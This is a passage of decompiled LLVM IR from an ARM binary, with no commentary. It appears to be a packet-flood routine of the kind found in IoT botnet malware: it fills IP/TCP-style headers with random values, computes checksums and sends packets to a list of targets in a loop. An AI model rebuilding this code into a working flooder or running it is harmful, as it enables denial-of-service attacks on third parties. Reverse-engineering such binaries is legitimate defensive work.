  %v1_c1ec = trunc i32 %v0_c1ec to i8
  %v2_c1ec = load i32, i32* %r5.global-to-local, align 4
  %v3_c1ec = add i32 %v2_c1ec, 9
  %v4_c1ec = inttoptr i32 %v3_c1ec to i8*
  store i8 %v1_c1ec, i8* %v4_c1ec, align 1
  %v0_c1f0 = call i32 @function_117dc()
  store i32 %v0_c1f0, i32* %r0.global-to-local, align 4
  store i32 %v1_bfa4, i32* %r1.global-to-local, align 4
  store i1 %v2_c1fc, i1* %cpsr_z.global-to-local, align 1
  %v1_c200 = sub i32 1023, %v0_c1f0
  store i32 %v1_c200, i32* %r3.global-to-local, align 4
  br i1 %v2_c1fc, label %.thread24, label %.thread25

.thread24:                                        ; preds = %bb95
  %v2_c208 = load i32, i32* %r5.global-to-local, align 4
  %v3_c208 = add i32 %v2_c208, 16
  %v4_c208 = inttoptr i32 %v3_c208 to i32*
  store i32 %v1_c200, i32* %v4_c208, align 4
  br label %bb96

.thread25:                                        ; preds = %bb95
  %v1_c204 = load i32, i32* %r4.global-to-local, align 4
  %v2_c204 = add i32 %v1_c204, 16
  %v3_c204 = inttoptr i32 %v2_c204 to i32*
  %v4_c204 = load i32, i32* %v3_c204, align 4
  store i32 %v4_c204, i32* %r3.global-to-local, align 4
  %v2_c20c = load i32, i32* %r5.global-to-local, align 4
  %v3_c20c = add i32 %v2_c20c, 16
  %v4_c20c = inttoptr i32 %v3_c20c to i32*
  store i32 %v4_c204, i32* %v4_c20c, align 4
  br label %bb96

bb96:                                             ; preds = %.thread24, %.thread25
  store i32 %v4_c08c, i32* %r3.global-to-local, align 4
  %v0_c214 = load i32, i32* %r4.global-to-local, align 4
  %v1_c214 = add i32 %v0_c214, 44
  store i32 %v1_c214, i32* %r6.global-to-local, align 4
  %v1_c218 = load i32, i32* %r5.global-to-local, align 4
  %v2_c218 = add i32 %v1_c218, 12
  %v3_c218 = inttoptr i32 %v2_c218 to i32*
  store i32 %v0_c1f0, i32* %v3_c218, align 4
  store i32 %v4_c21c, i32* %r2.global-to-local, align 4
  %v0_c220 = load i32, i32* %r3.global-to-local, align 4
  %v1_c220 = trunc i32 %v0_c220 to i8
  %v2_c220 = load i32, i32* %r6.global-to-local, align 4
  %v3_c220 = inttoptr i32 %v2_c220 to i8*
  store i8 %v1_c220, i8* %v3_c220, align 1
  %v3_c224 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c224, i32* %r3.global-to-local, align 4
  %v0_c228 = load i32, i32* %r2.global-to-local, align 4
  %v1_c228 = trunc i32 %v0_c228 to i8
  %v2_c228 = load i32, i32* %r6.global-to-local, align 4
  %v3_c228 = add i32 %v2_c228, 5
  %v4_c228 = inttoptr i32 %v3_c228 to i8*
  store i8 %v1_c228, i8* %v4_c228, align 1
  %v0_c22c = load i32, i32* %r3.global-to-local, align 4
  %v1_c22c = add i32 %v0_c22c, 1
  store i32 %v1_c22c, i32* %r4.global-to-local, align 4
  store i32 %v3_c0a4, i32* %r1.global-to-local, align 4
  store i32 %v7_c234, i32* %r2.global-to-local, align 4
  %v1_c238 = load i32, i32* @fp, align 4
  %v9_c238 = icmp eq i32 %v1_c22c, %v1_c238
  store i1 %v9_c238, i1* %cpsr_z.global-to-local, align 1
  %v2_c23c = load i32, i32* %r6.global-to-local, align 4
  %v3_c23c = add i32 %v2_c23c, 1
  %v4_c23c = inttoptr i32 %v3_c23c to i8*
  store i8 %v5_c0b4, i8* %v4_c23c, align 1
  %v0_c240 = load i32, i32* %r7.global-to-local, align 4
  %v1_c240 = trunc i32 %v0_c240 to i8
  %v2_c240 = load i32, i32* %r6.global-to-local, align 4
  %v3_c240 = add i32 %v2_c240, 2
  %v4_c240 = inttoptr i32 %v3_c240 to i8*
  store i8 %v1_c240, i8* %v4_c240, align 1
  %v0_c244 = load i32, i32* %r2.global-to-local, align 4
  %v1_c244 = trunc i32 %v0_c244 to i8
  %v2_c244 = load i32, i32* %r6.global-to-local, align 4
  %v3_c244 = add i32 %v2_c244, 3
  %v4_c244 = inttoptr i32 %v3_c244 to i8*
  store i8 %v1_c244, i8* %v4_c244, align 1
  %v0_c248 = load i32, i32* %r8.global-to-local, align 4
  %v1_c248 = trunc i32 %v0_c248 to i8
  %v2_c248 = load i32, i32* %r6.global-to-local, align 4
  %v3_c248 = add i32 %v2_c248, 4
  %v4_c248 = inttoptr i32 %v3_c248 to i8*
  store i8 %v1_c248, i8* %v4_c248, align 1
  %v0_c24c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c24c, i32* %stack_var_-40, align 4
  %v5_c250 = icmp slt i32 %v1_c22c, %v1_c238
  br i1 %v5_c250, label %dec_label_pc_c0c4, label %dec_label_pc_c254

dec_label_pc_c254:                                ; preds = %bb96
  %v1_c25c = add i32 %v5_bef0, 8
  store i32 %v1_c25c, i32* %r3.global-to-local, align 4
  %v1_c260 = add i32 %v5_bef0, 52
  store i32 %v1_c260, i32* %r1.global-to-local, align 4
  %v0_c26c.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_c26c.preheader

dec_label_pc_c26c.preheader:                      ; preds = %dec_label_pc_c254, %dec_label_pc_c500
  %v0_c26c.pre = phi i32 [ %v0_c26c.pre.pre, %dec_label_pc_c254 ], [ %v0_bfb4, %dec_label_pc_c500 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_c260, %dec_label_pc_c254 ], [ %v1_c50c, %dec_label_pc_c500 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_c25c, %dec_label_pc_c254 ], [ %v1_c508, %dec_label_pc_c500 ]
  %v2_c4e4 = icmp eq i32 %v1_bf10, 0
  %v2_c2e4 = icmp eq i32 %v1_bfa4, 0
  %v2_c2b0 = icmp eq i32 %v5_bf44, -1
  %v7_c2b0 = icmp eq i32 %v5_bf44, -1
  br label %dec_label_pc_c26c

dec_label_pc_c26c:                                ; preds = %dec_label_pc_c300, %dec_label_pc_c26c.preheader
  %v0_c26c = phi i32 [ %v0_c26c.pre, %dec_label_pc_c26c.preheader ], [ %v1_c3c4, %dec_label_pc_c300 ]
  %v2_c26c = icmp eq i32 %v0_c26c, 0
  store i1 %v2_c26c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_c26c, 1
  br label %dec_label_pc_c274

dec_label_pc_c274:                                ; preds = %dec_label_pc_c274, %dec_label_pc_c26c
  br i1 %tmp97, label %dec_label_pc_c274, label %dec_label_pc_c278

dec_label_pc_c278:                                ; preds = %dec_label_pc_c274
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_c284

dec_label_pc_c284:                                ; preds = %dec_label_pc_c300, %dec_label_pc_c278
  %v1_c298 = phi i32 [ %v1_c3c0, %dec_label_pc_c300 ], [ 0, %dec_label_pc_c278 ]
  %v5_c288 = mul i32 %v1_c298, 24
  %v1_c28c = load i32, i32* @sb, align 4
  %v2_c28c = add i32 %v1_c28c, %v5_c288
  store i32 %v2_c28c, i32* %r3.global-to-local, align 4
  store i32 %v2_be24, i32* %r1.global-to-local, align 4
  %v1_c294 = add i32 %v2_c28c, 20
  %v2_c294 = inttoptr i32 %v1_c294 to i8*
  %v3_c294 = load i8, i8* %v2_c294, align 1
  %v4_c294 = zext i8 %v3_c294 to i32
  store i32 %v4_c294, i32* %r2.global-to-local, align 4
  %v4_c298 = mul i32 %v1_c298, 4
  %v5_c298 = add i32 %v4_c298, %v2_be24
  %v6_c298 = inttoptr i32 %v5_c298 to i32*
  %v7_c298 = load i32, i32* %v6_c298, align 4
  store i32 %v7_c298, i32* @r5, align 4
  %v7_c29c = icmp eq i8 %v3_c294, 31
  store i1 %v7_c29c, i1* %cpsr_z.global-to-local, align 1
  %v1_c2a0 = add i32 %v7_c298, 24
  store i32 %v1_c2a0, i32* @r6, align 4
  %v1_c2a4 = add i32 %v7_c298, 44
  store i32 %v1_c2a4, i32* @r7, align 4
  %tmp105 = icmp ult i8 %v3_c294, 32
  br i1 %tmp105, label %dec_label_pc_c3e4, label %dec_label_pc_c2ac

dec_label_pc_c2ac:                                ; preds = %dec_label_pc_c284
  store i32 %v5_bf44, i32* %r2.global-to-local, align 4
  store i1 %v7_c2b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c2b0, label %dec_label_pc_c44c, label %dec_label_pc_c2b8

dec_label_pc_c2b8:                                ; preds = %dec_label_pc_c3e4, %dec_label_pc_c2ac
  store i32 65535, i32* @r4, align 4
  %v0_c2c0 = load i32, i32* @sl, align 4
  %v9_c2c0 = icmp eq i32 %v0_c2c0, 65535
  store i1 %v9_c2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c2c0, label %dec_label_pc_c464, label %dec_label_pc_c2c8

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c44c.dec_label_pc_c2c8_crit_edge, %dec_label_pc_c2b8
  %v1_c2cc = phi i32 [ %v1_c2cc.pre, %dec_label_pc_c44c.dec_label_pc_c2c8_crit_edge ], [ 65535, %dec_label_pc_c2b8 ]
  store i32 %v3_bfac, i32* %r3.global-to-local, align 4
  %v9_c2cc = icmp eq i32 %v3_bfac, %v1_c2cc
  store i1 %v9_c2cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c2cc, label %dec_label_pc_c49c, label %dec_label_pc_c2d4

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_c464.dec_label_pc_c2d4_crit_edge, %dec_label_pc_c2c8
  %v1_c2d8 = phi i32 [ %v1_c2d8.pre, %dec_label_pc_c464.dec_label_pc_c2d4_crit_edge ], [ %v1_c2cc, %dec_label_pc_c2c8 ]
  store i32 %v3_bfb0, i32* %r1.global-to-local, align 4
  %v9_c2d8 = icmp eq i32 %v3_bfb0, %v1_c2d8
  store i1 %v9_c2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c2d8, label %dec_label_pc_c4b8, label %dec_label_pc_c2e0

dec_label_pc_c2e0:                                ; preds = %dec_label_pc_c49c, %dec_label_pc_c2d4
  store i32 %v1_bfa4, i32* %r2.global-to-local, align 4
  store i1 %v2_c2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c2e4, label %dec_label_pc_c4dc, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_c2e0
  %v1_c2e8 = load i32, i32* @r5, align 4
  %v2_c2e8 = add i32 %v1_c2e8, 16
  %v3_c2e8 = inttoptr i32 %v2_c2e8 to i32*
  %v4_c2e8 = load i32, i32* %v3_c2e8, align 4
  store i32 %v4_c2e8, i32* %r3.global-to-local, align 4
  %v2_c2ec = load i32, i32* @r6, align 4
  %v3_c2ec = add i32 %v2_c2ec, 16
  %v4_c2ec = inttoptr i32 %v3_c2ec to i32*
  store i32 %v4_c2e8, i32* %v4_c2ec, align 4
  br label %dec_label_pc_c2f4

dec_label_pc_c2f4:                                ; preds = %bb102, %.thread26
  store i32 %v1_bf10, i32* %r3.global-to-local, align 4
  store i1 %v2_c4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c4e4, label %dec_label_pc_c300, label %dec_label_pc_c4f0

dec_label_pc_c300:                                ; preds = %dec_label_pc_c2f4, %dec_label_pc_c4dc, %dec_label_pc_c4f0
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c304 = load i32, i32* @r8, align 4
  %v1_c304 = trunc i32 %v0_c304 to i8
  %v2_c304 = load i32, i32* @r5, align 4
  %v3_c304 = add i32 %v2_c304, 10
  %v4_c304 = inttoptr i32 %v3_c304 to i8*
  store i8 %v1_c304, i8* %v4_c304, align 1
  %v0_c308 = load i32, i32* @r8, align 4
  %v1_c308 = trunc i32 %v0_c308 to i8
  %v2_c308 = load i32, i32* @r5, align 4
  %v3_c308 = add i32 %v2_c308, 11
  %v4_c308 = inttoptr i32 %v3_c308 to i8*
  store i8 %v1_c308, i8* %v4_c308, align 1
  %v0_c30c = load i32, i32* @r5, align 4
  store i32 %v0_c30c, i32* @r0, align 4
  %v2_c310 = call i32 @function_fda0(i32 %v0_c30c, i32 20)
  %v3_c310 = trunc i32 %v2_c310 to i8
  %v4_c314 = sdiv i32 %v2_c310, 256
  store i32 %v4_c314, i32* %r3.global-to-local, align 4
  %v1_c318 = trunc i32 %v4_c314 to i8
  %v2_c318 = load i32, i32* @r5, align 4
  %v3_c318 = add i32 %v2_c318, 11
  %v4_c318 = inttoptr i32 %v3_c318 to i8*
  store i8 %v1_c318, i8* %v4_c318, align 1
  %v3_c31c = load i32, i32* @r5, align 4
  %v4_c31c = add i32 %v3_c31c, 10
  %v5_c31c = inttoptr i32 %v4_c31c to i8*
  store i8 %v3_c310, i8* %v5_c31c, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c324 = load i32, i32* @r8, align 4
  %v1_c324 = trunc i32 %v0_c324 to i8
  %v2_c324 = load i32, i32* @r6, align 4
  %v3_c324 = add i32 %v2_c324, 10
  %v4_c324 = inttoptr i32 %v3_c324 to i8*
  store i8 %v1_c324, i8* %v4_c324, align 1
  %v0_c328 = load i32, i32* @r8, align 4
  %v1_c328 = trunc i32 %v0_c328 to i8
  %v2_c328 = load i32, i32* @r6, align 4
  %v3_c328 = add i32 %v2_c328, 11
  %v4_c328 = inttoptr i32 %v3_c328 to i8*
  store i8 %v1_c328, i8* %v4_c328, align 1
  %v0_c32c = load i32, i32* @r6, align 4
  store i32 %v0_c32c, i32* @r0, align 4
  %v2_c330 = call i32 @function_fda0(i32 %v0_c32c, i32 20)
  %v3_c330 = trunc i32 %v2_c330 to i8
  store i32 %v2_c330, i32* %r0.global-to-local, align 4
  %v4_c334 = sdiv i32 %v2_c330, 256
  store i32 %v4_c334, i32* %r3.global-to-local, align 4
  %v3_c338 = load i32, i32* @r6, align 4
  %v4_c338 = add i32 %v3_c338, 10
  %v5_c338 = inttoptr i32 %v4_c338 to i8*
  store i8 %v3_c330, i8* %v5_c338, align 1
  %v0_c33c = load i32, i32* %r3.global-to-local, align 4
  %v1_c33c = trunc i32 %v0_c33c to i8
  %v2_c33c = load i32, i32* @r6, align 4
  %v3_c33c = add i32 %v2_c33c, 11
  %v4_c33c = inttoptr i32 %v3_c33c to i8*
  store i8 %v1_c33c, i8* %v4_c33c, align 1
  %v0_c340 = load i32, i32* @r7, align 4
  %v1_c340 = add i32 %v0_c340, 4
  %v2_c340 = inttoptr i32 %v1_c340 to i8*
  %v3_c340 = load i8, i8* %v2_c340, align 1
  %v4_c340 = zext i8 %v3_c340 to i32
  store i32 %v4_c340, i32* %r3.global-to-local, align 4
  %v1_c344 = add i32 %v0_c340, 5
  %v2_c344 = inttoptr i32 %v1_c344 to i8*
  %v3_c344 = load i8, i8* %v2_c344, align 1
  %v4_c344 = zext i8 %v3_c344 to i32
  store i32 %v0_c340, i32* @r1, align 4
  %v4_c34c = mul nuw nsw i32 %v4_c344, 256
  %v5_c34c = or i32 %v4_c34c, %v4_c340
  store i32 %v5_c34c, i32* %r2.global-to-local, align 4
  %v0_c350 = load i32, i32* @r8, align 4
  %v1_c350 = trunc i32 %v0_c350 to i8
  %v3_c350 = add i32 %v0_c340, 6
  %v4_c350 = inttoptr i32 %v3_c350 to i8*
  store i8 %v1_c350, i8* %v4_c350, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_c358 = load i32, i32* @r8, align 4
  %v1_c358 = trunc i32 %v0_c358 to i8
  %v2_c358 = load i32, i32* @r7, align 4
  %v3_c358 = add i32 %v2_c358, 7
  %v4_c358 = inttoptr i32 %v3_c358 to i8*
  store i8 %v1_c358, i8* %v4_c358, align 1
  %v0_c35c = load i32, i32* @r6, align 4
  store i32 %v0_c35c, i32* %r0.global-to-local, align 4
  %v4_c360 = call i32 @function_fdfc(i32 %v0_c35c, i32 %v0_c340, i32 %v5_c34c, i32 %stack_var_-152.0.ph)
  %v5_c360 = trunc i32 %v4_c360 to i8
  store i32 %v4_c360, i32* %r0.global-to-local, align 4
  %v3_c364 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c364, i32* %r3.global-to-local, align 4
  %v3_c368 = mul i32 %v3_c364, 32
  store i32 %v3_c368, i32* %r2.global-to-local, align 4
  %v0_c36c = load i32, i32* @r5, align 4
  %v1_c36c = add i32 %v0_c36c, 16
  %v2_c36c = inttoptr i32 %v1_c36c to i32*
  %v3_c36c = load i32, i32* %v2_c36c, align 4
  store i32 %v3_c36c, i32* %r1.global-to-local, align 4
  %v5_c370 = mul i32 %v3_c364, 24
  store i32 %v5_c370, i32* %r2.global-to-local, align 4
  %v4_c37442 = udiv i32 %v4_c360, 256
  %v1_c378 = trunc i32 %v4_c37442 to i8
  %v2_c378 = load i32, i32* @r7, align 4
  %v3_c378 = add i32 %v2_c378, 7
  %v4_c378 = inttoptr i32 %v3_c378 to i8*
  store i8 %v1_c378, i8* %v4_c378, align 1
  %v0_c37c = load i32, i32* %r2.global-to-local, align 4
  %v1_c37c = load i32, i32* @sb, align 4
  %v2_c37c = add i32 %v1_c37c, %v0_c37c
  store i32 %v2_c37c, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_c384 = load i32, i32* @r7, align 4
  %v4_c384 = add i32 %v3_c384, 6
  %v5_c384 = inttoptr i32 %v4_c384 to i8*
  store i8 %v5_c360, i8* %v5_c384, align 1
  %v0_c388 = load i32, i32* %r1.global-to-local, align 4
  %v1_c388 = load i32, i32* %lr.global-to-local, align 4
  %v2_c388 = add i32 %v1_c388, 4
  %v3_c388 = inttoptr i32 %v2_c388 to i32*
  store i32 %v0_c388, i32* %v3_c388, align 4
  %v0_c38c = load i32, i32* %r3.global-to-local, align 4
  %v1_c38c = trunc i32 %v0_c38c to i8
  %v2_c38c = load i32, i32* %r2.global-to-local, align 4
  %v3_c38c = load i32, i32* @sb, align 4
  %v4_c38c = add i32 %v3_c38c, %v2_c38c
  %v5_c38c = inttoptr i32 %v4_c38c to i8*
  store i8 %v1_c38c, i8* %v5_c38c, align 1
  %v0_c390 = load i32, i32* @r8, align 4
  %v1_c390 = trunc i32 %v0_c390 to i8
  %v2_c390 = load i32, i32* %lr.global-to-local, align 4
  %v3_c390 = add i32 %v2_c390, 2
  %v4_c390 = inttoptr i32 %v3_c390 to i8*
  store i8 %v1_c390, i8* %v4_c390, align 1
  %v0_c394 = load i32, i32* @r8, align 4
  %v1_c394 = trunc i32 %v0_c394 to i8
  %v2_c394 = load i32, i32* %lr.global-to-local, align 4
  %v3_c394 = add i32 %v2_c394, 1
  %v4_c394 = inttoptr i32 %v3_c394 to i8*
  store i8 %v1_c394, i8* %v4_c394, align 1
  %v0_c398 = load i32, i32* @r8, align 4
  %v1_c398 = trunc i32 %v0_c398 to i8
  %v2_c398 = load i32, i32* %lr.global-to-local, align 4
  %v3_c398 = add i32 %v2_c398, 3
  %v4_c398 = inttoptr i32 %v3_c398 to i8*
  store i8 %v1_c398, i8* %v4_c398, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c3a4 = load i32, i32* @r5, align 4
  store i32 %v0_c3a4, i32* %r1.global-to-local, align 4
  store i32 %v3_bf58, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_c3b0 = load i32, i32* %lr.global-to-local, align 4
  %v6_c3b8 = call i32 @_sendto(i32 %v3_bf58, i32 %v0_c3a4, i32 %stack_var_-120.0.ph, i32 16384, i32 %v0_c3b0, i32 16)
  %v3_c3bc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c3bc, i32* %r3.global-to-local, align 4
  %v1_c3c0 = add i32 %v3_c3bc, 1
  store i32 %v1_c3c0, i32* %r0.global-to-local, align 4
  %v1_c3c4 = load i32, i32* @fp, align 4
  %v9_c3c4 = icmp eq i32 %v1_c3c0, %v1_c3c4
  store i1 %v9_c3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3c0, i32* %stack_var_-40, align 4
  %v6_c3cc = icmp slt i32 %v1_c3c0, %v1_c3c4
  br i1 %v6_c3cc, label %dec_label_pc_c284, label %dec_label_pc_c26c

dec_label_pc_c3d4:                                ; preds = %dec_label_pc_bf68
  store i32 %v3_bf58, i32* %r0.global-to-local, align 4
  %v1_c3d8 = call i32 @_close(i32 %v3_bf58)
  store i32 %v1_c3d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %dec_label_pc_be04, %dec_label_pc_c3d4
  %v29_c3e0 = phi i32 [ %v3_bf58, %dec_label_pc_be04 ], [ %v1_c3d8, %dec_label_pc_c3d4 ]
  store i32 %v3_be04, i32* %r4.global-to-local, align 4
  store i32 %v6_be04, i32* %r5.global-to-local, align 4
  store i32 %v9_be04, i32* %r6.global-to-local, align 4
  store i32 %v12_be04, i32* %r7.global-to-local, align 4
  store i32 %v15_be04, i32* %r8.global-to-local, align 4
  ret i32 %v29_c3e0

dec_label_pc_c3e4:                                ; preds = %dec_label_pc_c284
  %v1_c3e4 = add i32 %v2_c28c, 16
  %v2_c3e4 = inttoptr i32 %v1_c3e4 to i32*
  %v3_c3e4 = load i32, i32* %v2_c3e4, align 4
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = call i32 @function_117dc()
  store i32 %v0_c3e8, i32* %r0.global-to-local, align 4
  %v3_c3ec = load i32, i32* %stack_var_-40, align 4
  %v5_c3f4 = mul i32 %v3_c3ec, 24
  %v0_c3f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c3fc = load i32, i32* @sb, align 4
  %v2_c3fc = add i32 %v1_c3fc, %v5_c3f4
  store i32 %v2_c3fc, i32* %r1.global-to-local, align 4
  %v1_c400 = and i32 %v0_c3f8, 65280
  store i32 %v1_c400, i32* %r3.global-to-local, align 4
  %v1_c3f8 = udiv i32 %v0_c3f8, 256
  %v3_c404 = and i32 %v1_c3f8, 65280
  store i32 %v3_c404, i32* %r2.global-to-local, align 4
  %v1_c40c = add i32 %v2_c3fc, 20
  %v2_c40c = inttoptr i32 %v1_c40c to i8*
  %v3_c40c = load i8, i8* %v2_c40c, align 1
  %v4_c40c = zext i8 %v3_c40c to i32
  store i32 %v4_c40c, i32* %lr.global-to-local, align 4
  %v2_c418 = call i32 @llvm.bswap.i32(i32 %v0_c3f8)
  %v7_c41c = lshr i32 %v0_c3e8, %v4_c40c
  %v8_c41c = add i32 %v7_c41c, %v2_c418
  %v3_c428 = mul i32 %v8_c41c, 16777216
  %v1_c42c = and i32 %v8_c41c, 65280
  store i32 %v1_c42c, i32* %r0.global-to-local, align 4
  store i32 %v5_bf44, i32* %r2.global-to-local, align 4
  %v4_c438 = mul nuw nsw i32 %v1_c42c, 256
  %v5_c438 = or i32 %v4_c438, %v3_c428
  store i32 %v5_c438, i32* %r1.global-to-local, align 4
  %v2_c43c = call i32 @llvm.bswap.i32(i32 %v8_c41c)
  store i32 %v2_c43c, i32* %r3.global-to-local, align 4
  store i1 %v7_c2b0, i1* %cpsr_z.global-to-local, align 1
  %v1_c444 = load i32, i32* @r5, align 4
  %v2_c444 = add i32 %v1_c444, 16
  %v3_c444 = inttoptr i32 %v2_c444 to i32*
  store i32 %v2_c43c, i32* %v3_c444, align 4
  br i1 %v2_c2b0, label %dec_label_pc_c44c, label %dec_label_pc_c2b8

dec_label_pc_c44c:                                ; preds = %dec_label_pc_c3e4, %dec_label_pc_c2ac
  %v0_c44c = call i32 @function_117dc()
  store i32 %v0_c44c, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_c458 = load i32, i32* @sl, align 4
  %v9_c458 = icmp eq i32 %v0_c458, 65535
  store i1 %v9_c458, i1* %cpsr_z.global-to-local, align 1
  %v1_c45c = load i32, i32* @r5, align 4
  %v2_c45c = add i32 %v1_c45c, 12
  %v3_c45c = inttoptr i32 %v2_c45c to i32*
  store i32 %v0_c44c, i32* %v3_c45c, align 4
  br i1 %v9_c458, label %dec_label_pc_c464, label %dec_label_pc_c44c.dec_label_pc_c2c8_crit_edge

dec_label_pc_c44c.dec_label_pc_c2c8_crit_edge:    ; preds = %dec_label_pc_c44c
  %v1_c2cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c2c8

dec_label_pc_c464:                                ; preds = %dec_label_pc_c44c, %dec_label_pc_c2b8
  %v0_c464 = call i32 @function_117dc()
  %v3_c46c = urem i32 %v0_c464, 65536
  store i32 %v3_c46c, i32* %r0.global-to-local, align 4
  %v3_c47015 = udiv i32 %v0_c464, 256
  %v1_c474 = trunc i32 %v3_c47015 to i8
  %v2_c474 = load i32, i32* @r5, align 4
  %v3_c474 = add i32 %v2_c474, 5
  %v4_c474 = inttoptr i32 %v3_c474 to i8*
  store i8 %v1_c474, i8* %v4_c474, align 1
  %v0_c478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_bfac, i32* %r3.global-to-local, align 4
  %v1_c480 = sub i32 999, %v0_c478
  store i32 %v1_c480, i32* %r2.global-to-local, align 4
  %v3_c484 = sdiv i32 %v1_c480, 256
  store i32 %v3_c484, i32* %r1.global-to-local, align 4
  %v1_c488 = load i32, i32* @r4, align 4
  %v9_c488 = icmp eq i32 %v3_bfac, %v1_c488
  store i1 %v9_c488, i1* %cpsr_z.global-to-local, align 1
  %v1_c48c = trunc i32 %v0_c478 to i8
  %v2_c48c = load i32, i32* @r5, align 4
  %v3_c48c = add i32 %v2_c48c, 4
  %v4_c48c = inttoptr i32 %v3_c48c to i8*
  store i8 %v1_c48c, i8* %v4_c48c, align 1
  %v0_c490 = load i32, i32* %r1.global-to-local, align 4
  %v1_c490 = trunc i32 %v0_c490 to i8
  %v2_c490 = load i32, i32* @r6, align 4
  %v3_c490 = add i32 %v2_c490, 5
  %v4_c490 = inttoptr i32 %v3_c490 to i8*
  store i8 %v1_c490, i8* %v4_c490, align 1
  %v0_c494 = load i32, i32* %r2.global-to-local, align 4
  %v1_c494 = trunc i32 %v0_c494 to i8
  %v2_c494 = load i32, i32* @r6, align 4
  %v3_c494 = add i32 %v2_c494, 4
  %v4_c494 = inttoptr i32 %v3_c494 to i8*
  store i8 %v1_c494, i8* %v4_c494, align 1
  %v0_c498 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c498, label %dec_label_pc_c49c, label %dec_label_pc_c464.dec_label_pc_c2d4_crit_edge

dec_label_pc_c464.dec_label_pc_c2d4_crit_edge:    ; preds = %dec_label_pc_c464
  %v1_c2d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c2d4

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c464, %dec_label_pc_c2c8
  %v0_c49c = call i32 @function_117dc()
  %v1_c49c = trunc i32 %v0_c49c to i8
  store i32 %v0_c49c, i32* %r0.global-to-local, align 4
  store i32 %v3_bfb0, i32* %r1.global-to-local, align 4
  %v4_c4a4 = sdiv i32 %v0_c49c, 256
  store i32 %v4_c4a4, i32* %r3.global-to-local, align 4
  %v1_c4a8 = load i32, i32* @r4, align 4
  %v9_c4a8 = icmp eq i32 %v3_bfb0, %v1_c4a8
  store i1 %v9_c4a8, i1* %cpsr_z.global-to-local, align 1
  %v3_c4ac = load i32, i32* @r5, align 4
  %v4_c4ac = add i32 %v3_c4ac, 44
  %v5_c4ac = inttoptr i32 %v4_c4ac to i8*
  store i8 %v1_c49c, i8* %v5_c4ac, align 1
  %v0_c4b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4b0 = trunc i32 %v0_c4b0 to i8
  %v2_c4b0 = load i32, i32* @r7, align 4
  %v3_c4b0 = add i32 %v2_c4b0, 1
  %v4_c4b0 = inttoptr i32 %v3_c4b0 to i8*
  store i8 %v1_c4b0, i8* %v4_c4b0, align 1
  %v0_c4b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4b4, label %dec_label_pc_c4b8, label %dec_label_pc_c2e0

dec_label_pc_c4b8:                                ; preds = %dec_label_pc_c49c, %dec_label_pc_c2d4
  %v0_c4b8 = call i32 @function_117dc()
  %v1_c4b8 = trunc i32 %v0_c4b8 to i8
  store i32 %v0_c4b8, i32* %r0.global-to-local, align 4
  store i32 %v1_bfa4, i32* %r2.global-to-local, align 4
  %v4_c4c0 = sdiv i32 %v0_c4b8, 256
  store i32 %v4_c4c0, i32* %r3.global-to-local, align 4
  store i1 %v2_c2e4, i1* %cpsr_z.global-to-local, align 1
  %v1_c4c8 = trunc i32 %v4_c4c0 to i8
  %v2_c4c8 = load i32, i32* @r7, align 4
  %v3_c4c8 = add i32 %v2_c4c8, 3
  %v4_c4c8 = inttoptr i32 %v3_c4c8 to i8*
  store i8 %v1_c4c8, i8* %v4_c4c8, align 1
  %v0_c4cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4cc, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_c4b8
  %v1_c4cc = load i32, i32* @r5, align 4
  %v2_c4cc = add i32 %v1_c4cc, 16
  %v3_c4cc = inttoptr i32 %v2_c4cc to i32*
  %v4_c4cc = load i32, i32* %v3_c4cc, align 4
  store i32 %v4_c4cc, i32* %r3.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_c4b8, %bb100
  %v3_c4d0 = load i32, i32* @r7, align 4
  %v4_c4d0 = add i32 %v3_c4d0, 2
  %v5_c4d0 = inttoptr i32 %v4_c4d0 to i8*
  store i8 %v1_c4b8, i8* %v5_c4d0, align 1
  %v0_c4d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4d4, label %dec_label_pc_c4dc, label %bb102

bb102:                                            ; preds = %bb101
  %v1_c4d4 = load i32, i32* %r3.global-to-local, align 4
